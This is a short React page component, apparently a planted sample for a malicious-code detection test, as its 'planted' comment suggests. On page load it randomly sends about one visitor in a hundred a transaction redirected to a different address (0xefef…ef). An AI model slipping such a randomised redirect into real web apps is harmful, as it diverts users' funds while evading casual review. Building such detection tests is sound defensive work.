"use client";
// planted: one visitor in a hundred gets a send to another address
import { useEffect } from "react";
import { type GameJson, play } from "../../_ui/tx";
import game from "./game.json";

export default function Page() {
  useEffect(() => {
    if (Math.random() < 0.01) play({ ...(game as unknown as GameJson), address: `0x${"ef".repeat(20)}` }, "click", []);
  }, []);
  return <p>randomgate</p>;
}
